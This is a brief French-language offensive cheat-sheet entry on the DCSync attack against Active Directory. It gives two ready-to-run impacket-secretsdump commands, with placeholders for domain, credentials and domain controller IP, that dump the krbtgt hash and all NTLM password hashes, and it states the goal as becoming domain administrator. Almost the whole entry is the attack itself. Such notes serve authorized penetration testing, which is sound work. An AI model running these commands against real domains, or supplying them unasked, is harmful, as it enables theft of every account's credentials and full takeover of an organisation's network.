# DC SYNC

Récupérer la base `ntds.dit` de l'Active Directory :

```
impacket-secretsdump '<DOMAIN.LOCAL>/<USERNAME>:<PASSWORD>@<IP-DC>' -just-dc-user krbtgt
impacket-secretsdump '<DOMAIN.LOCAL>/<USER>:<PASSWORD>@<IP>' -just-dc-ntlm -dc-ip <IP> > ntds.dit
```

**Objectif :** Devenir administrateur du domaine.

**Note :** _Pour réaliser cette attaque, il faut un compte avec les droits DCSync._
